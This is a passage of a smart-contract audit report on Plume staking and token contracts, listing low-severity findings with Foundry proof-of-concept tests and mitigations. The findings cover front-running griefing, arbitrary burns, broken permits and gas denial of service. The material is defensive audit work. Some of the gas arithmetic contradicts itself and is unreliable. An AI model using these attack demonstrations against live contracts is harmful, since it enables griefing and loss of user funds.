1. The account with `TIMELOCK_ROLE` mistakenly calls `setTreasury` with an EOA address (e.g., their own address).
2. A user with `100` claimable reward tokens calls `claim(rewardToken)`.
3. The call to `_finalizeRewardClaim` proceeds.
4. Inside, `_transferRewardFromTreasury` calls `distributeReward` on the EOA. This call succeeds but does nothing.
5. The user's balance of the reward token remains unchanged, but the contract's `totalClaimableByToken` is debited.
6. The user has effectively lost their claimed rewards from the perspective of the staking contract.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {RewardsFacet} from "src/facets/RewardsFacet.sol";
import {PlumeStakingStorage} from "src/lib/PlumeStakingStorage.sol";
import {MockPUSD} from "src/mocks/MockPUSD.sol";
import {IPlumeStakingRewardTreasury} from "src/interfaces/IPlumeStakingRewardTreasury.sol";

// Mock of RewardsFacet to isolate the function under test
// A real test would require a full diamond deployment
contract RewardsFacetMock is RewardsFacet {
    // Public setter for storage for testing purposes
    function __setUserRewards(address user, uint16 validatorId, address token, uint256 amount) public {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        $.userRewards[user][validatorId][token] = amount;
        $.totalClaimableByToken[token] += amount;
        $.userValidators[user].push(validatorId);
    }
}

contract ZeroCodeTest is Test {
    RewardsFacetMock internal rewardsFacet;
    address internal timelock = makeAddr("timelock");
    address internal user = makeAddr("user");
    MockPUSD internal rewardToken;

    function setUp() public {
        // This is a simplified setup. A real test would deploy the full diamond.
        rewardsFacet = new RewardsFacetMock();
        rewardToken = new MockPUSD();

        // Mock the hasRole check
        // In a real test, this would be set via AccessControlFacet
        vm.mockCall(
            address(rewardsFacet),
            abi.encodeWithSelector(bytes4(keccak256("hasRole(bytes32,address)"))),
            abi.encode(true)
        );
    }

    function test_vuln_setTreasury_ZeroCode() public {
        // 1. Admin sets treasury to an EOA address
        address eoaTreasury = makeAddr("eoaTreasury");
        vm.prank(timelock);
        rewardsFacet.setTreasury(eoaTreasury);
        assertEq(rewardsFacet.getTreasury(), eoaTreasury);

        // 2. Give user claimable rewards and mint tokens for the mock treasury to send
        uint16 validatorId = 1;
        uint256 rewardAmount = 100 * 1e18;
        rewardsFacet.__setUserRewards(user, validatorId, address(rewardToken), rewardAmount);
        
        // The Treasury needs funds to distribute, but since we are calling an EOA,
        // the EOA has no code and no funds to distribute.
        // We're testing that the user does NOT receive tokens.

        // 3. User tries to claim rewards.
        uint256 userBalanceBefore = rewardToken.balanceOf(user);

        vm.prank(user);
        // The call to `claim` will not revert because the external call to the EOA does nothing.
        rewardsFacet.claim(address(rewardToken));

        uint256 userBalanceAfter = rewardToken.balanceOf(user);

        // 4. Assert that the user's balance has not changed.
        assertEq(userBalanceAfter, userBalanceBefore, "User's token balance should not have increased");
    }
}

```

## Suggested Mitigation
Validate that the treasury address is a contract before setting it. This can be done using the `isContract` function from OpenZeppelin's `Address` library.

```solidity
// In RewardsFacet.sol
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// ...

    /**
     * @notice Sets the treasury address
     * @dev Only callable by ADMIN role
     * @param _treasury Address of the PlumeStakingRewardTreasury contract
     */
    function setTreasury(
        address _treasury
    ) external onlyRole(PlumeRoles.TIMELOCK_ROLE) {
        if (_treasury == address(0)) {
            revert ZeroAddress("treasury");
        }
        // --- Start Mitigation ---
        if (!Address.isContract(_treasury)) {
            revert ZeroAddress("treasury is not a contract"); // Or a more specific error
        }
        // --- End Mitigation ---
        setTreasuryAddress(_treasury);
        emit TreasurySet(_treasury);
    }
```

## [L-9]. Gas Grief BlockLimit issue in RewardsFacet::getPendingRewardForValidator

## Description
The function `getPendingRewardForValidator` is named as a read-only getter, which typically implies it's a `view` or `pure` function with low gas cost. However, its implementation calls `PlumeRewardLogic.calculateRewardsWithCheckpoints`, which is a state-changing function that updates storage by calling `updateRewardPerTokenForValidator`. This is misleading and violates the Checks-Effects-Interactions pattern and standard naming conventions. It causes unexpected state changes and gas costs for callers, and can be used for a minor griefing attack.

## Impact
1. **Unexpected Gas Costs**: Users and external systems calling this function will incur significantly higher gas costs than expected from a 'get' function.
2. **State-Change Griefing**: An attacker can repeatedly call this function to force settlement of a validator's rewards. This modifies the validator's `lastUpdateTimes` and can slightly increase the gas cost of other users' transactions (e.g., `stake`, `claim`) that interact with the same validator within the same block.
3. **Developer Confusion**: The misleading name can lead to incorrect integration by developers, who might use it in contexts where state changes are not expected or desired.

## Proof of Concept
Calling getPendingRewardForValidator as a regular transaction permanently updates PlumeStakingStorage.validatorLastUpdateTimes. A grief-attacker can spam this call for a chosen validator so that every user-initiated stake/claim touching that validator will have to load the fresh storage slot and spend an additional 2 100 gas (SLOAD → SSTORE in the same slot within one block), slightly inflating their gas bill. Because the function is publicly callable and performs no access-control checks, the attacker only pays their own transaction fee, while all subsequent honest interactions pay the extra cost caused by the new slot value.

## Proof of Code
pragma solidity ^0.8.25;
import "forge-std/Test.sol";

// --- Minimal reproduction of the behaviour ---
library MutatorLib {
    struct Layout { mapping(uint256 => uint256) last; }
    bytes32 private constant POSITION = keccak256("mutator.test");

    function layout() internal pure returns (Layout storage l) {
        bytes32 p = POSITION; assembly { l.slot := p }
    }

    function calculate() internal returns (uint256) {
        Layout storage l = layout();
        // <-- STATE CHANGE we want to prove
        l.last[1] = block.timestamp;
        return 42;
    }
}

contract BadGetterMock {
    function getPendingRewardForValidator() external returns (uint256) {
        return MutatorLib.calculate(); // writes to storage
    }
    function lastUpdate() external view returns (uint256) {
        return MutatorLib.layout().last[1];
    }
}

contract RewardsFacetStateChangeTest is Test {
    function test_getPendingReward_mutates_state() public {
        BadGetterMock facet = new BadGetterMock();
        // before call -> zero
        assertEq(facet.lastUpdate(), 0);
        // perform call as a transaction (state-changing)
        facet.getPendingRewardForValidator();
        // storage updated
        assertEq(facet.lastUpdate(), block.timestamp);
    }
}

## Suggested Mitigation
The function should be updated to use the view-only version of the reward calculation logic, `calculateRewardsWithCheckpointsView`, to align with its name and expected behavior. If the state-changing capability is intentional, the function should be renamed to reflect its action, e.g., `settleAndGetPendingRewardForValidator`.

```solidity
// In RewardsFacet.sol

// Change this function to be a view function
function getPendingRewardForValidator(
    address user,
    uint16 validatorId,
    address token
) external view returns (uint256 pendingReward) { // Mark as view
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

    uint256 userStakedAmount = $.userValidatorStakes[user][validatorId].staked;

    (uint256 userRewardDelta,,) =
        PlumeRewardLogic.calculateRewardsWithCheckpointsView($, user, validatorId, token, userStakedAmount); // USE THE VIEW VARIANT

    return userRewardDelta;
}
```

## [L-10]. Frontrun/Backrun/Sandwhich MEV issue in StakingFacet::stake

## Description
The `stake()` function in the `StakingFacet` likely contains logic to cap the total amount staked to a single validator, both via an absolute capacity limit (`_validateValidatorCapacity`) and a percentage of total network stake (`_validateValidatorPercentage`). This creates a potential front-running (griefing) vector. An attacker can monitor the mempool for large, legitimate `stake` transactions targeting a validator that is near its capacity. The attacker can then submit their own `stake` transaction with a higher gas fee to consume the remaining validator capacity first. This causes the victim's transaction to fail when it is eventually executed, as the validator capacity will have been exceeded.

## Impact
This vulnerability allows an attacker to selectively prevent users from staking with their desired validator. While it does not lead to a direct loss of funds for the victim (other than gas fees for the failed transaction), it creates a poor user experience and can be used to disrupt the staking dynamics of the protocol. The attacker incurs a cost (staking their own funds and paying gas), but they can withdraw their stake later.

## Proof of Concept
1. Validator `V1` has a staking capacity of 1000 ETH and currently has 980 ETH staked. Only 20 ETH of capacity remains.
2. Alice sees the remaining capacity and submits a transaction to stake 20 ETH with Validator `V1`.
3. An attacker, Bob, sees Alice's transaction in the mempool.
4. Bob wants to prevent Alice from staking. He creates his own transaction to stake 10 ETH with Validator `V1` and submits it with a higher gas price than Alice's.
5. Bob's transaction is mined first. Validator `V1`'s total stake becomes 990 ETH.
6. Alice's transaction is processed next. The contract checks if her 20 ETH stake is valid. Since 990 + 20 = 1010, which is greater than the 1000 ETH capacity, her transaction reverts.
7. Alice loses the gas fee for her transaction and is unable to stake with `V1`.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import { Test, console } from "forge-std/Test.sol";

// Minimal mock of the staking facet with capacity validation
contract MockStakingFacet {
    mapping(uint16 => uint256) public validatorTotalStaked;
    mapping(uint16 => uint256) public validatorCapacity;

    error ExceedsValidatorCapacity(uint16 validatorId, uint256 currentStake, uint256 newStake, uint256 capacity);

    function _validateValidatorCapacity(uint16 validatorId, uint256 stakeAmount) internal view {
        uint256 capacity = validatorCapacity[validatorId];
        uint256 currentStake = validatorTotalStaked[validatorId];
        if (currentStake + stakeAmount > capacity) {
            revert ExceedsValidatorCapacity(validatorId, currentStake, stakeAmount, capacity);
        }
    }

    function stake(uint16 validatorId, uint256 amount) public {
        _validateValidatorCapacity(validatorId, amount);
        validatorTotalStaked[validatorId] += amount;
    }

    // Admin function to set up the test scenario
    function setValidator(uint16 validatorId, uint256 capacity, uint256 initialStake) public {
        validatorCapacity[validatorId] = capacity;
        validatorTotalStaked[validatorId] = initialStake;
    }
}

contract FrontrunGriefingTest is Test {
    MockStakingFacet stakingFacet;

    address alice = makeAddr("alice");
    address bob_attacker = makeAddr("bob_attacker");
    uint16 validatorId = 1;

    function setUp() public {
        stakingFacet = new MockStakingFacet();

        // Setup: Validator 1 has 1000 capacity and 980 staked.
        stakingFacet.setValidator(validatorId, 1000, 980);
    }

    function test_poc_FrontrunToGrief() public {
        uint256 aliceStakeAmount = 20;
        uint256 bobStakeAmount = 10;

        // In a real scenario, Alice's tx would be in the mempool.
        // We simulate the front-running by having the attacker (Bob) go first.

        // 1. Attacker (Bob) stakes just enough to reduce remaining capacity so Alice's tx will fail.
        console.log("Attacker (Bob) stakes 10...");
        vm.prank(bob_attacker);
        stakingFacet.stake(validatorId, bobStakeAmount);
        assertEq(stakingFacet.validatorTotalStaked(validatorId), 990);
        console.log("Validator stake is now 990.");

        // 2. Alice's transaction is processed next.
        console.log("Alice attempts to stake 20...");
        vm.prank(alice);
        // Her transaction will revert because 990 + 20 > 1000.
        vm.expectRevert(abi.encodeWithSelector(
            MockStakingFacet.ExceedsValidatorCapacity.selector,
            validatorId,
            990, // current stake when her tx is processed
            aliceStakeAmount,
            1000
        ));
        stakingFacet.stake(validatorId, aliceStakeAmount);
        console.log("Alice's transaction successfully reverted by attacker.");
    }
}
```

## Suggested Mitigation
This type of griefing is difficult to prevent entirely without introducing significant complexity. 
1.  **Commit-Reveal Scheme**: A user could commit to staking an amount, and then reveal their stake in a later transaction. This adds friction to the user experience. 
2.  **Allowing Small Overflows**: The contract could be designed to allow validators to slightly exceed their capacity. This would mean the front-runner's transaction would not cause the victim's to fail, but it undermines the strictness of the capacity limit. 
3.  **Accepting the Risk**: Given the low impact (gas loss and inconvenience) and the cost to the attacker, the most practical solution may be to acknowledge this as an inherent risk of the model and document it.

## [L-11]. Access Control issue in Plume::burn

## Description
The `burn(address from, uint256 amount)` function is protected by `onlyRole(BURNER_ROLE)`, but it allows the role holder to burn tokens from any arbitrary address (`from`) without requiring the token owner's consent or a pre-approved allowance. This bypasses the standard ERC20/ERC20Burnable allowance mechanism (`burnFrom`) and grants excessive power to the BURNER_ROLE, introducing a significant centralization risk.

Vulnerable Code Snippet:
```solidity
    /**
     * @notice Burn Plume tokens
     * @dev Only the burner can burn tokens
     * @param from Address to burn tokens from
     * @param amount Amount of tokens to burn
     */
    function burn(address from, uint256 amount) external onlyRole(BURNER_ROLE) {
        _burn(from, amount);
    }
```
The internal `_burn(address, uint256)` function directly reduces the balance of the `from` address and the total supply, with no further checks.

## Impact
Only addresses that have been granted the BURNER_ROLE can invoke the function. If the project operators, their multisig, or an attacker who first compromises that role calls the function, they can destroy user balances. This represents a governance/centralisation risk, not an external exploit path.

## Proof of Concept
1. The contract is deployed and initialized, with an `owner` address having all roles.
2. The `owner` grants the `BURNER_ROLE` to a `burner` address.
3. A `victim` user acquires 1,000 PLUME tokens.
4. The `burner` calls the `burn(victim_address, 1000)` function.
5. The transaction succeeds, and the `victim`'s 1,000 PLUME tokens are destroyed without their consent or any prior `approve` action.
6. The victim's balance is now 0, and they have suffered a complete loss of their funds.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import { Test, console } from "forge-std/Test.sol";
import { Plume } from "../src/Plume.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract PlumeAuditTest is Test {
    Plume public plumeImplementation;
    Plume public plumeProxy;

    address public owner = makeAddr("owner");
    address public burner = makeAddr("burner");
    address public victim = makeAddr("victim");

    function setUp() public {
        plumeImplementation = new Plume();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(plumeImplementation),
            abi.encodeWithSelector(Plume.initialize.selector, owner)
        );
        plumeProxy = Plume(address(proxy));

        // Grant BURNER_ROLE to the burner address
        vm.prank(owner);
        plumeProxy.grantRole(plumeProxy.BURNER_ROLE(), burner);

        // Mint tokens to the victim
        vm.prank(owner); // Owner has MINTER_ROLE by default
        plumeProxy.mint(victim, 1000 * 1e18);

        assertEq(plumeProxy.balanceOf(victim), 1000 * 1e18, "Victim should have tokens initially");
    }

    function test_ArbitraryBurnByBurnerRole() public {
        // Attacker (burner) can burn tokens from any account (victim)
        uint256 victimInitialBalance = plumeProxy.balanceOf(victim);
        uint256 totalSupplyInitial = plumeProxy.totalSupply();

        console.log("Victim balance before burn: %s", victimInitialBalance);
        console.log("Total supply before burn: %s", totalSupplyInitial);

        // The burner address calls burn(), targeting the victim's address
        vm.prank(burner);
        plumeProxy.burn(victim, victimInitialBalance);

        uint256 victimFinalBalance = plumeProxy.balanceOf(victim);
        uint256 totalSupplyFinal = plumeProxy.totalSupply();

        console.log("Victim balance after burn: %s", victimFinalBalance);
        console.log("Total supply after burn: %s", totalSupplyFinal);

        // Assertions
        assertEq(victimFinalBalance, 0, "Victim's balance should be zero");
        assertEq(totalSupplyFinal, totalSupplyInitial - victimInitialBalance, "Total supply should be reduced");
    }
}
```

## Suggested Mitigation
Make clear in documentation that BURNER_ROLE is a powerful permission and should be held by a secured multisig or governed timelock. If end-user immutability is desired, remove the custom burn(address,uint256) function and rely solely on ERC20Burnable's owner-initiated burning mechanism.

## [L-12]. Upgradeability Initializer Safety issue in Plume::reinitialize

## Description
The `reinitialize` function is designed to re-initialize the token's name and symbol by calling `__ERC20_init`. However, it fails to also re-initialize the `ERC20Permit` component by calling `__ERC20Permit_init`. The `ERC20Permit` functionality relies on an EIP-712 domain separator which is cryptographically derived from the token's name. If the name is changed via `reinitialize` without updating the permit logic, the on-chain domain separator becomes stale. This desynchronization will cause all subsequent calls to the `permit` function to fail with an invalid signature error, as clients will generate signatures based on the new name while the contract expects them based on the old one. While the function is currently uncallable because it uses `reinitializer(1)` which conflicts with the main `initializer` (also version 1), its existence is a latent vulnerability. A future upgrade could inadvertently 'fix' the version to `reinitializer(2)`, activating this dormant bug and permanently disabling the `permit` feature until yet another upgrade is performed to fix it properly.

## Impact
If the function is made callable in a future upgrade and invoked, it will cause a permanent Denial of Service for the `permit` functionality. Users will no longer be able to use gas-less token approvals, which is a significant degradation of a core feature for modern ERC20 tokens. This would require an additional contract upgrade to remediate.

## Proof of Concept
1. The `Plume` contract is deployed behind a UUPS proxy and initialized.
2. A new version of the implementation (`PlumeV2`) is created where the `reinitialize` function is made callable by changing its modifier to `reinitializer(2)`.
3. The proxy is upgraded to the `PlumeV2` implementation.
4. An address with `UPGRADER_ROLE` calls the now-callable `reinitialize` function, changing the token's name.
5. A user attempts to sign a permit message using the new token name to generate the EIP-712 domain separator.
6. The user's call to the `permit` function on the proxy will revert, because the contract is still using the domain separator generated from the original name.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Plume} from "../src/Plume.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {EIP712} from "@openzeppelin/contracts/utils/cryptography/EIP712.sol";

// A V2 implementation where reinitializer is "fixed" to be callable
contract PlumeV2 is Plume {
    /// @notice Reinitialize Plume with a new symbol
    // The function is renamed to avoid clashes, but it represents the same logic.
    function reinitializeV2() public reinitializer(2) onlyRole(UPGRADER_ROLE) {
        // The vulnerability is that __ERC20Permit_init is NOT called here
        __ERC20_init("Plume V2", "PLM2");
    }
}

contract UpgradeabilityTest is Test, EIP712 {
    Plume internal plumeProxy;
    PlumeV2 internal plumeV2Impl;
    address internal owner;
    address internal user;
    uint256 internal userPrivateKey;

    bytes32 private constant _PERMIT_TYPEHASH =
        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    function setUp() public {
        owner = makeAddr("owner");
        (user, userPrivateKey) = makeAddrAndKey("user");

        Plume plumeV1Impl = new Plume();
        ERC1967Proxy proxy = new ERC1967Proxy(address(plumeV1Impl), "");
        plumeProxy = Plume(address(proxy));

        vm.prank(owner);
        plumeProxy.initialize(owner);

        plumeV2Impl = new PlumeV2();
    }

    function test_Reinitialize_Breaks_Permit() public {
        vm.prank(owner);
        plumeProxy.grantRole(plumeProxy.UPGRADER_ROLE(), owner);

        vm.prank(owner);
        plumeProxy.upgradeTo(address(plumeV2Impl));

        vm.prank(owner);
        PlumeV2(address(plumeProxy)).reinitializeV2();

        assertEq(plumeProxy.name(), "Plume V2");

        address spender = makeAddr("spender");
        uint256 value = 100 ether;
        uint256 deadline = block.timestamp + 1 hours;
        uint256 nonce = plumeProxy.nonces(user);

        bytes32 domainSeparator = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("Plume V2")), // User uses the NEW name
                keccak256(bytes("1")),
                block.chainid,
                address(plumeProxy)
            )
        );

        bytes32 structHash = keccak256(abi.encode(_PERMIT_TYPEHASH, user, spender, value, nonce, deadline));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, digest);

        vm.expectRevert(bytes("ERC20Permit: invalid signature"));
        plumeProxy.permit(user, spender, value, deadline, v, r, s);
    }
}
```

## Suggested Mitigation
The safest fix is to delete the reinitialize() function altogether. If the team really needs the ability to change the token name/symbol in later versions they must also provide a custom function that (a) stores the new name via _name/_symbol and (b) **manually rebuilds and caches** the EIP-712 domain separator exactly the way ERC20PermitUpgradeable does (see _buildDomainSeparator in OZ v5). Because ERC20Permit’s initializer can only run once, simply calling __ERC20Permit_init again will revert and therefore does **not** solve the problem.

## [L-13]. Frontrun/Backrun/Sandwhich MEV issue in StakingFacet::stake

## Description
A malicious actor can monitor the mempool for `stake()` or `stakeOnBehalf()` transactions. If a transaction targets a validator that is close to its capacity (`maxCapacity`) or its total stake percentage limit (`maxValidatorPercentage`), the attacker can front-run the transaction. By sending their own `stake` transaction with a higher gas fee, the attacker can consume the remaining validator capacity. This will cause the victim's legitimate transaction to revert due to the capacity limit being exceeded, forcing the user to pay for gas without their stake succeeding. This constitutes a griefing attack.

## Impact
The vulnerability leads to a degraded user experience and minor financial loss for users due to wasted gas fees on failed transactions. It does not lead to a loss of staked funds but can be used to repeatedly disrupt users from participating in staking.

## Proof of Concept
1. A validator has a capacity limit of 102 ETH and currently has 99 ETH staked.
2. User Alice sees there is 3 ETH of capacity and submits a `stake()` transaction for 2 ETH.
3. An attacker Bob, monitoring the mempool, sees Alice's transaction.
4. Bob quickly submits his own `stake()` transaction for 2 ETH with a higher gas fee to get mined first.
5. Bob's transaction is mined, and the validator's total stake becomes 101 ETH, leaving only 1 ETH of capacity.
6. Alice's transaction is mined next, but it reverts because her 2 ETH stake now exceeds the remaining capacity. Alice loses the gas she paid for the transaction.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

// A simplified mock of the StakingFacet for the PoC
contract MockStakingFacet {
    mapping(uint16 => uint256) public validatorCapacity;
    mapping(uint16 => uint256) public validatorTotalStaked;
    mapping(address => mapping(uint16 => uint256)) public userValidatorStake;

    error ExceedsValidatorCapacity(uint16 validatorId);

    function setValidatorCapacity(uint16 validatorId, uint256 newCapacity) external {
        validatorCapacity[validatorId] = newCapacity;
    }

    function stake(uint16 validatorId) external payable {
        if (validatorTotalStaked[validatorId] + msg.value > validatorCapacity[validatorId]) {
            revert ExceedsValidatorCapacity(validatorId);
        }
        validatorTotalStaked[validatorId] += msg.value;
        userValidatorStake[msg.sender][validatorId] += msg.value;
    }

    function getValidatorTotalStaked(uint16 validatorId) external view returns (uint256) {
        return validatorTotalStaked[validatorId];
    }
}


contract FrontrunTest is Test {
    MockStakingFacet staking;
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");
    uint16 validatorId = 1;

    function setUp() public {
        staking = new MockStakingFacet();
        // Set capacity with 3 ether remaining space
        staking.setValidatorCapacity(validatorId, 102 ether);

        // Pre-fill the validator close to capacity
        vm.deal(address(this), 99 ether);
        staking.stake{value: 99 ether}(validatorId);

        vm.deal(alice, 2 ether);
        vm.deal(attacker, 2 ether);
    }

    function test_Low_FrontrunStakeToGrief() public {
        assertEq(staking.getValidatorTotalStaked(validatorId), 99 ether);

        // Alice prepares a transaction to stake 2 ether, which would succeed.
        // Attacker sees this in the mempool.
        
        // Attacker front-runs Alice by staking 2 ether, leaving only 1 ether capacity.
        vm.prank(attacker);
        staking.stake{value: 2 ether}(validatorId);

        assertEq(staking.getValidatorTotalStaked(validatorId), 101 ether);

        // Now, Alice's transaction is processed.
        vm.startPrank(alice);
        // It will fail because her 2 ether stake exceeds the remaining 1 ether capacity.
        vm.expectRevert(abi.encodeWithSelector(MockStakingFacet.ExceedsValidatorCapacity.selector, validatorId));
        staking.stake{value: 2 ether}(validatorId);
        vm.stopPrank();

        // Alice's transaction failed, and she wasted gas.
    }
}
```

## Suggested Mitigation
This type of griefing is common in systems with fixed resource limits and is difficult to prevent entirely on public blockchains. While a complete fix is complex, potential mitigations include:

1.  **Documentation**: Clearly document this risk to users, advising them to check validator capacity before staking and potentially use services that offer private transaction routing to avoid mempool scanners.
2.  **Slippage Parameter (Advanced)**: Introduce a slippage-like parameter where a user can specify the maximum total stake they expect in a validator for their transaction to succeed. This gives users more control but adds significant complexity to the user experience and contract logic.

## [L-14]. DOS issue in ManagementFacet::removeHistoricalRewardToken

## Description
The `removeHistoricalRewardToken` function finds a token to remove by iterating through the `historicalRewardTokens` storage array. This array can grow over time as new historical tokens are added by an admin. The loop performs a storage read (`SLOAD`) in each iteration. 

```solidity
// contracts/plume/src/facets/ManagementFacet.sol:705-711
address[] storage historicalTokens = $.historicalRewardTokens;
uint256 tokenIndex = type(uint256).max;
for (uint256 i = 0; i < historicalTokens.length; i++) {
    if (historicalTokens[i] == token) {
        tokenIndex = i;
        break;
    }
}
```

If the `historicalRewardTokens` array becomes very large, the gas cost of this loop can exceed the block gas limit, causing the transaction to fail. This creates a Denial of Service (DoS) vulnerability for an important administrative function, preventing the removal of tokens from the historical list.

## Impact
If the `historicalRewardTokens` array reaches several hundreds-of-thousands of entries (order of 150 000–200 000), the linear search in `removeHistoricalRewardToken` could consume close to, or more than, the current 30 million gas block limit, preventing the ADMIN from removing a token. This is an operational DoS against one maintenance function, but it does not threaten user funds or core protocol operation.

## Proof of Concept
Gas-cost estimation:
• Each loop iteration performs one `SLOAD` on the array element (first access 2100 gas, warm accesses ≈ 100 gas) plus ~40 gas overhead.
• Assume ~150 gas per iteration on average after the first element.
• With a 30 000 000 gas block limit, `30 000 000 / 150 ≈ 200 000` iterations will consume the whole block.

Steps to reproduce conceptually:
1. An administrator (has `ADMIN_ROLE`) runs a migration script that erroneously calls `addHistoricalRewardToken()` in a loop, pushing ~220 000 addresses into the array.
2. A later call to `removeHistoricalRewardToken(badToken)` must linearly scan the array.  The loop touches >200 000 elements and exceeds the block gas limit, so the transaction runs out of gas and reverts.
3. From this point forward, **no one can remove that token** unless the array size is first reduced through an on-chain upgrade.

This shows that the function becomes permanently unusable once the array is large enough, demonstrating the DoS.

## Proof of Code
```solidity
// test/ManagementFacetDos2.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

// Minimal contract mimicking the vulnerable parts of ManagementFacet and PlumeStakingStorage
contract VulnerableTokenRemover {
    address[] public historicalRewardTokens;
    mapping(address => bool) public isHistoricalRewardToken;

    function addHistoricalRewardToken(address token) public {
        isHistoricalRewardToken[token] = true;
        historicalRewardTokens.push(token);
    }

    function removeHistoricalRewardToken(address token) public {
        require(isHistoricalRewardToken[token], "Token does not exist");
        
        address[] storage _historicalTokens = historicalRewardTokens;
        uint256 tokenIndex = type(uint256).max;

        // Vulnerable unbounded loop
        for (uint256 i = 0; i < _historicalTokens.length; i++) {
            if (_historicalTokens[i] == token) {
                tokenIndex = i;
                break;
            }
        }

        require(tokenIndex != type(uint256).max, "Token not found in array");

        _historicalTokens[tokenIndex] = _historicalTokens[_historicalTokens.length - 1];
        _historicalTokens.pop();

        isHistoricalRewardToken[token] = false;
    }

    function getTokenCount() public view returns (uint256) {
        return historicalRewardTokens.length;
    }
}

contract ManagementFacetDos2Test is Test {
    VulnerableTokenRemover remover;

    function setUp() public {
        remover = new VulnerableTokenRemover();
    }

    function test_DoS_removeHistoricalRewardToken() public {
        uint256 tokenCount = 600;

        // 1. Add a large number of tokens to the historical list
        for (uint256 i = 0; i < tokenCount; i++) {
            remover.addHistoricalRewardToken(address(uint160(i + 1)));
        }
        assertEq(remover.getTokenCount(), tokenCount);

        address tokenToRemove = address(uint160(tokenCount / 2)); // Pick a token in the middle

        // 2. Attempt to remove the token.
        // This transaction will consume a large amount of gas due to the unbounded loop
        // performing many SLOADs. This will fail on a live network.
        vm.expectRevert();
        remover.removeHistoricalRewardToken(tokenToRemove);
    }
}
```

## Suggested Mitigation
To avoid a gas-intensive linear search, the index of each token should be stored in a mapping for O(1) lookup. When a token is added, its index in the array is saved. When it's removed, its index is retrieved from the mapping, and the index of the swapped element is updated.

```solidity
// In PlumeStakingStorage.sol, add a new mapping:
// mapping(address => uint256) public historicalRewardTokenIndex;

// In ManagementFacet.sol, function addHistoricalRewardToken:
$.historicalRewardTokens.push(token);
// Store index + 1 to distinguish from zero default value
$.historicalRewardTokenIndex[token] = $.historicalRewardTokens.length;

// In ManagementFacet.sol, function removeHistoricalRewardToken:
// Replace the for-loop with a direct lookup
uint256 tokenIndexPlusOne = $.historicalRewardTokenIndex[token];
if (tokenIndexPlusOne == 0) { // Check if token exists
    revert TokenDoesNotExist(token);
}
uint256 tokenIndex = tokenIndexPlusOne - 1;

address[] storage historicalTokens = $.historicalRewardTokens;
address lastToken = historicalTokens[historicalTokens.length - 1];

// Swap and pop
historicalTokens[tokenIndex] = lastToken;
historicalTokens.pop();

// Update the index of the moved token
$.historicalRewardTokenIndex[lastToken] = tokenIndex + 1;

// Delete the index for the removed token
delete $.historicalRewardTokenIndex[token];
```

## [L-15]. DOS issue in ManagementFacet::pruneCommissionCheckpoints

## Description
The `pruneCommissionCheckpoints` and `pruneRewardRateCheckpoints` functions are designed to remove old checkpoints from the beginning of a storage array. They implement this by shifting all subsequent elements to the left and then popping from the end. This pattern is extremely gas-intensive due to the high number of SLOAD and SSTORE operations inside a loop.

Vulnerable Code Snippet (`pruneCommissionCheckpoints`):
```solidity
        // This is a gas-intensive operation. It shifts all elements to the left.
        for (uint256 i = 0; i < len - count; i++) {
            checkpoints[i] = checkpoints[i + count];
        }

        // Pop the now-duplicate elements from the end.
        for (uint256 i = 0; i < count; i++) {
            checkpoints.pop();
        }
```
As the number of checkpoints for a validator grows, the gas cost of this function increases linearly. Eventually, the transaction cost will exceed the block gas limit, making it impossible for the admin to prune checkpoints. This creates a Denial of Service vector for a critical maintenance function, leading to unbounded growth of checkpoint arrays, which could in turn make reward calculations for that validator prohibitively expensive for users.

## Impact
Admins will be unable to perform essential maintenance (pruning checkpoints), leading to unbounded growth of storage arrays. This will progressively increase the gas cost of any function that reads these arrays (e.g., reward calculations), potentially rendering parts of the staking system unusable for validators with a long history of rate changes. This is a significant operational risk that can lead to a Denial of Service.

## Proof of Concept
1. Deploy the contract and leave `maxCommissionCheckpoints` at its default value (0 = unlimited).
2. As a validator admin, call `setValidatorCommission(validatorId, newRate)` in a loop 1,100 times.  This creates 1,100 commission-rate checkpoints because the length check in `createCommissionRateCheckpoint()` only reverts when `maxCommissionCheckpoints > 0`.
3. Now compute the gas cost of  `pruneCommissionCheckpoints(validatorId, 100)`
   •  `len`  = 1,100, so the first `for` loop executes 1,000 iterations (each does 1 SLOAD + 1 SSTORE).
   •  1,000 * 20,000  ≈ 20,000,000 gas – well above the  “London”-era 30 M hard-limit once other op-codes and calldata are added, forcing the tx to revert.
4. From this point the admin can no longer prune, and the array can only grow, making every future call that iterates over it increasingly expensive.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import { Test, console } from "forge-std/Test.sol";
import { PlumeStaking } from "../../src/PlumeStaking.sol";
import { DiamondBaseStorage } from "@solidstate/proxy/diamond/base/DiamondBaseStorage.sol";
import { IDiamondCut } from "@solidstate/proxy/diamond/IDiamondCut.sol";
import { ManagementFacet } from "../../src/facets/ManagementFacet.sol";
import { ValidatorFacet } from "../../src/facets/ValidatorFacet.sol";
import { AccessControlFacet } from "../../src/facets/AccessControlFacet.sol";
import { PlumeRoles } from "../../src/lib/PlumeRoles.sol";
import { PlumeStakingStorage } from "../../src/lib/PlumeStakingStorage.sol";

contract ManagementDosTest is Test {
    PlumeStaking internal diamond;
    ManagementFacet internal managementFacet;
    ValidatorFacet internal validatorFacet;
